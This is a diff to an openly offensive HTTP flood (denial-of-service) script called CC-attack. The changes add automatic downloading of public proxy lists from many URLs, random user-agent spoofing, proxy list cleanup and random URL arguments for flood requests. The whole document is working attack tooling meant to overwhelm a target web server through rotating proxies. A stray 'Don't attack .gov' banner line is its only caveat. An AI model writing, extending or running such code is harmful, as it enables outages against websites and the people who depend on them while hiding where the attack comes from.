@@ -12,6 +12,7 @@ import string
 import socket
 import os
 import time
+import requests
 
 try:
 	import socks
@@ -26,8 +27,6 @@ global_vars = {#Share it in multiprocessing, and set default values
 	"Method":"get",
 	"Target_Url":"",
 	"Proxy_type":5,# 0 for http, 4 for socks4, 5 for socks5
-	#"Proxy_File":"proxy.txt",
-	#"Output_File":"proxy.txt",
 	"Thread_num":400,
 	"Process_num":1,
 	"Payload":"",
@@ -35,10 +34,6 @@ global_vars = {#Share it in multiprocessing, and set default values
 	"Cookies_file":"",
 	"RandUrl":False,
 	"Path":"/",
-
-	#proxies stuff
-	"check_proxies":False,
-	"download_proxy":False,
 
 	#untouchable stuff
 	"Proxies_list":[],
@@ -113,7 +108,7 @@ def PrintLogo():
 	  CCCCC/   CCCCC/   |___________|/
 >--------------------------------------------->
 Version Preview
-                              C0d3d by L330n123
+.                             C0d3d by L330n123
 ┌─────────────────────────────────────────────┐
 │        Tos: Don't attack .gov website       │
 ├─────────────────────────────────────────────┤
@@ -123,50 +118,45 @@ Version Preview
 │ Link: https://github.com/Leeon123/CC-attack │
 └─────────────────────────────────────────────┘''')
 
+
 def getuseragent():
-  platforms = ['Macintosh', 'Windows', 'X11']
-  platform = random.choice(platforms)
-
-  if platform == 'Macintosh':
-    oses = ['68K', 'PPC', 'Intel Mac OS X']
-  elif platform == 'Windows':
-    oses = ['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64']
-  elif platform == 'X11':
-    oses = ['Linux i686', 'Linux x86_64']
-  os = random.choice(oses)
-
-  browsers = ['chrome', 'firefox', 'ie']
-  browser = random.choice(browsers)
-
-  if browser == 'chrome':
-    webkit = str(random.randint(500, 599))
-    version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
-    return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
-  elif browser == 'firefox':
-    currentYear = time.strftime("%Y")
-    year = str(random.randint(2020, int(currentYear)))
-    month = random.randint(1, 12)
-    if month < 10:
-      month = '0' + str(month)
-    else:
-      month = str(month)
-    day = random.randint(1, 30)
-    if day < 10:
-      day = '0' + str(day)
-    else:
-      day = str(day)
-    gecko = year + month + day
-    version = str(random.randint(1, 72)) + '.0'
-    return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
-  elif browser == 'ie':
-    version = str(random.randint(1, 99)) + '.0'
-    engine = str(random.randint(1, 99)) + '.0'
-    option = random.choice([True, False])
-    if option == True:
-      token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
-    else:
-      token = ''
-    return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
+	platform = random.choice(['Macintosh', 'Windows', 'X11'])
+	if platform == 'Macintosh':
+		os  = random.choice(['68K', 'PPC', 'Intel Mac OS X'])
+	elif platform == 'Windows':
+		os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win 9x 4.90', 'WindowsCE', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows NT 10.0; Win64; x64'])
+	elif platform == 'X11':
+		os  = random.choice(['Linux i686', 'Linux x86_64'])
+	browser = random.choice(['chrome', 'firefox', 'ie'])
+	if browser == 'chrome':
+		webkit = str(random.randint(500, 599))
+		version = str(random.randint(0, 99)) + '.0' + str(random.randint(0, 9999)) + '.' + str(random.randint(0, 999))
+		return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
+	elif browser == 'firefox':
+		currentYear = int(time.strftime("%Y"))
+		year = str(random.randint(2020, currentYear))
+		month = random.randint(1, 12)
+		if month < 10:
+			month = '0' + str(month)
+		else:
+			month = str(month)
+		day = random.randint(1, 30)
+		if day < 10:
+			day = '0' + str(day)
+		else:
+			day = str(day)
+		gecko = year + month + day
+		version = str(random.randint(1, 72)) + '.0'
+		return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
+	elif browser == 'ie':
+		version = str(random.randint(1, 99)) + '.0'
+		engine = str(random.randint(1, 99)) + '.0'
+		option = random.choice([True, False])
+		if option == True:
+			token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; '
+		else:
+			token = ''
+		return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'
 
 def RandomString(vars):
 	pattern = random.randint(0,3)
@@ -210,23 +200,22 @@ def build_processes(vars,events):
 	for _ in range(vars["Process_num"]):
 		multiprocessing.Process(target=build_threads, args=(vars,events,),daemon=True).start()
 
-
-def check_list(socks_file):
+def check_list(proxy_file):
 	print("> Checking list")
-	temp = open(socks_file).readlines()
-	temp_list = []
-	for i in temp:
-		if i not in temp_list:
-			if ':' in i and '#' not in i:
+	seen = set()
+	with open(proxy_file, "r") as f:
+		for line in f:
+			if ':' in line and '#' not in line:
 				try:
-					socket.inet_pton(socket.AF_INET,i.strip().split(":")[0])#check valid ip v4
-					temp_list.append(i)
+					socket.inet_pton(socket.AF_INET, line.strip().split(":")[0])
+					if line not in seen:
+						seen.add(line)
 				except:
 					pass
-	rfile = open(socks_file, "wb")
-	for i in list(temp_list):
-		rfile.write(bytes(i,encoding='utf-8'))
-	rfile.close()
+	with open(proxy_file,"w") as f:
+		for line in seen:
+			f.write(line)
+		
 
 def PreGenRequest(vars):
 	request =  vars["Method"].upper() + " " + vars["Path"] + "{url_arg}  HTTP/1.1\r\n"
@@ -246,8 +235,6 @@ def PreGenRequest(vars):
 		request += "Content-Type: text/html; charset=utf-8\r\n"
 		request += "Content-Legnth: {payload_len}\r\n"
 		request += "\r\n{payload}"
-
-	
 	
 	return request
 
@@ -267,6 +254,118 @@ def PrintHelp():
    -check    | check proxies
 =====================================================''')
 
+def download_proxies(vars, out_file):
+	proxy_type = vars["Proxy_type"]
+	api_list = set()
+	if proxy_type == 4:
+		api_list = [
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks4",
+			"https://openproxylist.xyz/socks4.txt",
+			"https://proxyspace.pro/socks4.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS4.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks4.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks4.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS4_RAW.txt",
+			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks4.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks4.txt",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+			"https://www.proxy-list.download/api/v1/get?type=socks4",
+			"https://www.proxyscan.io/download?type=socks4",
+			"https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&country=all",
+			"https://api.openproxylist.xyz/socks4.txt",]
+	elif proxy_type == 5:
+		api_list = [
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5&timeout=10000&country=all&simplified=true",
+			"https://www.proxy-list.download/api/v1/get?type=socks5",
+			"https://www.proxyscan.io/download?type=socks5",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt",
+			"https://api.openproxylist.xyz/socks5.txt",
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=socks5",
+			"https://openproxylist.xyz/socks5.txt",
+			"https://proxyspace.pro/socks5.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/SOCKS5.txt",
+			"https://raw.githubusercontent.com/manuGMG/proxy-365/main/SOCKS5.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt",
+			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/socks5.txt",]
+	elif proxy_type == 0:
+		api_list = ["https://api.proxyscrape.com/?request=displayproxies&proxytype=http",
+			"https://www.proxy-list.download/api/v1/get?type=http",
+			"https://www.proxyscan.io/download?type=http",
+			"https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt",
+			"https://api.openproxylist.xyz/http.txt",
+			"https://raw.githubusercontent.com/shiftytr/proxy-list/master/proxy.txt",
+			"http://alexa.lr2b.com/proxylist.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http.txt",
+			"https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+			"https://raw.githubusercontent.com/sunny9577/proxy-scraper/master/proxies.txt",
+			"https://raw.githubusercontent.com/opsxcq/proxy-list/master/list.txt",
+			"https://proxy-spider.com/api/proxies.example.txt",
+			"https://multiproxy.org/txt_all/proxy.txt",
+			"https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/http.txt",
+			"https://raw.githubusercontent.com/UserR3X/proxy-list/main/online/https.txt",
+			"https://api.proxyscrape.com/v2/?request=getproxies&protocol=http",
+			"https://openproxylist.xyz/http.txt",
+			"https://proxyspace.pro/http.txt",
+			"https://proxyspace.pro/https.txt",
+			"https://raw.githubusercontent.com/almroot/proxylist/master/list.txt",
+			"https://raw.githubusercontent.com/aslisk/proxyhttps/main/https.txt",
+			"https://raw.githubusercontent.com/B4RC0DE-TM/proxy-list/main/HTTP.txt",
+			"https://raw.githubusercontent.com/hendrikbgr/Free-Proxy-Repo/master/proxy_list.txt",
+			"https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-https.txt",
+			"https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt",
+			"https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt",
+			"https://raw.githubusercontent.com/proxy4parsing/proxy-list/main/http.txt",
+			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/http.txt",
+			"https://raw.githubusercontent.com/RX4096/proxy-list/main/online/https.txt",
+			"https://raw.githubusercontent.com/saisuiu/uiu/main/free.txt",
+			"https://raw.githubusercontent.com/saschazesiger/Free-Proxies/master/proxies/http.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+			"https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt",
+			"https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+			"https://rootjazz.com/proxies/proxies.txt",
+			"https://sheesh.rip/http.txt",
+			"https://www.proxy-list.download/api/v1/get?type=https"]
+
+	with open(out_file, "wb") as f:
+		for api in api_list:
+			try:
+				r = requests.get(api, timeout=5)
+				f.write(r.content)
+			except ConnectionError:
+				# Retry request after a short delay
+				time.sleep(0.5)
+				r = requests.get(api, timeout=5)
+				f.write(r.content)
+	if proxy_type == 4:
+		socks_proxy_net(out_file)
+	print("> Have already downloaded proxies list as "+out_file)
+
+def socks_proxy_net(out_file):
+	try:
+		r = requests.get("https://www.socks-proxy.net/",timeout=5)
+		part = str(r.content)
+		part = part.split("<tbody>")
+		part = part[1].split("</tbody>")
+		part = part[0].split("<tr><td>")
+		proxies = ""
+		for proxy in part:
+			proxy = proxy.split("</td><td>")
+			try:
+				proxies=proxies + proxy[0] + ":" + proxy[1] + "\n"
+			except:
+				pass
+			fd = open(out_file,"a")
+			fd.write(proxies)
+			fd.close()
+	except:
+		pass
+
 #################################
 #           CC-ATTACK           #
 #################################
@@ -276,7 +375,11 @@ def CC_ATTACK(vars,event):
 
 	# Generate the request
 	request = PreGenRequest(vars)
-	if (vars["RandUrl"])!=True:
+	path_parts = vars["Path"].partition("?")
+	add = "&" if path_parts[1] else "?"
+	if (vars["RandUrl"])==True:
+		request = request.format(url_arg=add+"{url_arg}")
+	else:
 		request = request.format(url_arg="")
 
 	# Wait signal
@@ -303,14 +406,14 @@ def CC_ATTACK(vars,event):
 			for _ in range(100):
 				# Use a random URL if specified
 				if vars["RandUrl"]:
-					request = request.format(url_arg=RandomString())
+					request = request.format(url_arg=RandomString(vars))
 
 				# Use a random payload if specified
 				if vars["Method"] == "post":
 					if vars["Payload"] != "":
 						request = request.format(payload=vars["Payload"],payload_len=len(vars["Payload"]))
 					else:
-						data = RandomString()
+						data = RandomString(vars)
 						request = request.format(payload=data,payload_len=len(data))
 
 				# Send the request
@@ -421,6 +524,7 @@ def main():
 	#Initial those "global" varibles
 	vars = global_vars
 	help = False
+	download = False
 	durations = 60
 	proxy_file = "proxy.txt"
 	for n,args in enumerate(sys.argv):
@@ -465,9 +569,11 @@ def main():
 			vars["Payload"] = ' '.join([str(txt) for txt in data])
 		if args == "-f":
 			proxy_file = sys.argv[n+1]
-		'''
+		if args == "-rand":
+			vars["RandUrl"] = True
 		if args == "-down":
-			download_socks=True
+			download=True
+		'''
 		if args == "-check":
 			check_proxies = True'''
 		if args == "-s":
@@ -476,10 +582,9 @@ def main():
 			except:
 				print("> -s must be integer")
 				return
-	print("> Method: [cc/post/head]")#slow]")
-	'''
-	if download_socks:
-		DownloadProxies(proxy_ver)'''
+	#print("> Method: [get/post/head]")#slow]")
+	if download:
+		download_proxies(vars,proxy_file)
 	if os.path.exists(proxy_file)!=True:
 		print("Proxies file not found")
 		return
